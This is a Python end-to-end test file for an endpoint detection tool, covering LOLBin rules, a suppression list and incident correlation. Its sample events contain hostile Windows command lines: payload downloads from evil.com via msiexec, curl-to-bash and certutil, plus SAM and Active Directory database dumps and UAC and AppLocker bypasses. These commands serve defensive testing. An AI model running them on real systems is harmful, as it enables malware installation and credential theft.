"""
test_fixes.py — End-to-end test for the three low-effort fixes:
  1. Extended LOLBin rules (56 L1 chains, 58 LOLBins)
  2. False positive suppression list
  3. Incident correlation
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from server import create_app
from server.core.detector import analyze, _chains_rules
from server.config import LOLBINS
from server.database.storage import (
    add_suppression, is_suppressed, get_suppressions, remove_suppression
)
from server.database.incidents import (
    get_incidents, get_incident, update_incident_status, incident_stats
)

app = create_app()

# Force rules to load
from server.core.detector import _chains_rules, initialize as _init
_init()  # idempotent — safe to call twice
PASS = 0
FAIL = 0

def check(label, condition):
    global PASS, FAIL
    if condition:
        print(f"  [PASS] {label}")
        PASS += 1
    else:
        print(f"  [FAIL] {label}")
        FAIL += 1

# ── Fix 1: LOLBin rules ───────────────────────────────────────────────────────
print("\n=== FIX 1: Extended LOLBin rules ===")
check("56+ L1 chains loaded", len(_chains_rules) >= 55)
check("58+ LOLBins in config", len(LOLBINS) >= 58)

lolbin_tests = [
    ("msiexec remote MSI",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"msiexec.exe","pid":100,
      "cmdline":"/i http://evil.com/payload.msi /quiet","time":1700000001}),
    ("WSL curl pipe bash",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"wsl.exe","pid":101,
      "cmdline":"curl http://evil.com/shell.sh | bash","time":1700000002}),
    ("ntdsutil IFM dump",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"ntdsutil.exe","pid":102,
      "cmdline":"ntdsutil ifm create full c:\\temp","time":1700000003}),
    ("installutil AppLocker bypass",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"installutil.exe","pid":103,
      "cmdline":"/logfile= /logtoconsole=false /u payload.exe","time":1700000004}),
    ("wsreset UAC bypass",
     {"system_id":"T","event":"process_spawn","parent":"wsreset.exe",
      "child":"cmd.exe","pid":104,"cmdline":"","time":1700000005}),
    ("esentutl SAM copy",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"esentutl.exe","pid":105,
      "cmdline":"/y c:\\windows\\system32\\config\\sam /d c:\\temp\\sam","time":1700000006}),
    ("cmstp INF script",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"cmstp.exe","pid":106,
      "cmdline":"/s /ns malicious.inf","time":1700000007}),
    ("diskshadow EXEC",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"diskshadow.exe","pid":107,
      "cmdline":"/s shadow_script.txt exec calc.exe","time":1700000008}),
]
for label, ev in lolbin_tests:
    alerts = analyze(ev)
    check(f"LOLBin detected: {label}", len(alerts) > 0)

# ── Fix 2: Suppression list ───────────────────────────────────────────────────
print("\n=== FIX 2: False positive suppression ===")

ok = add_suppression("DESKTOP-01","powershell.exe","HEURISTIC: Web request","testuser")
check("Add suppression rule", ok)

check("Matching prefix suppressed",
      is_suppressed("DESKTOP-01","powershell.exe","HEURISTIC: Web request — detail"))

check("Different reason NOT suppressed",
      not is_suppressed("DESKTOP-01","powershell.exe","L1 EXACT MATCH: Office Spawns Shell"))

check("Different system NOT suppressed",
      not is_suppressed("SERVER-02","powershell.exe","HEURISTIC: Web request"))

check("Different process NOT suppressed",
      not is_suppressed("DESKTOP-01","cmd.exe","HEURISTIC: Web request"))

sups = get_suppressions()
check("Suppression appears in list", len(sups) >= 1)

remove_suppression(sups[0]["id"])
check("After remove: no longer suppressed",
      not is_suppressed("DESKTOP-01","powershell.exe","HEURISTIC: Web request"))

# ── Fix 3: Incident correlation ───────────────────────────────────────────────
print("\n=== FIX 3: Incident correlation ===")

# Multi-alert attack sequence — should group into 1 incident
attack = [
    {"system_id":"INC-TEST","event":"process_spawn","parent":"winword.exe",
     "child":"cmd.exe","pid":200,"cmdline":"","time":1700001000},
    {"system_id":"INC-TEST","event":"process_spawn","parent":"cmd.exe",
     "child":"certutil.exe","pid":201,
     "cmdline":"-urlcache -f http://evil.com/payload.exe","time":1700001010},
    {"system_id":"INC-TEST","event":"process_spawn","parent":"cmd.exe",
     "child":"wmic.exe","pid":202,
     "cmdline":"/node:192.168.1.5 process call create whoami","time":1700001020},
]
for ev in attack:
    analyze(ev)

incs = get_incidents(system_id="INC-TEST")
check("Incident created for multi-alert attack", len(incs) >= 1)

if incs:
    inc = get_incident(incs[0]["id"])
    check("Incident has severity", inc["severity"] in ("CRITICAL","HIGH","MEDIUM"))
    check("Incident has title",    bool(inc["title"]))
    check("Multiple alerts grouped", len(inc["alert_ids"]) >= 2)

    ok = update_incident_status(incs[0]["id"], "investigating", "analyst")
    check("Status update to investigating", ok)
    inc2 = get_incident(incs[0]["id"])
    check("Status persisted", inc2["status"] == "investigating")

stats = incident_stats()
check("Incident stats returned", isinstance(stats, dict))
check("Stats has total key", "total" in stats)

# ── Summary ───────────────────────────────────────────────────────────────────
print(f"\n{'='*50}")
print(f"  Total:  {PASS + FAIL}   Passed: {PASS}   Failed: {FAIL}")
print(f"{'='*50}")
if FAIL == 0:
    print("  ALL TESTS PASSED")
else:
    print(f"  {FAIL} TEST(S) FAILED")
    sys.exit(1)
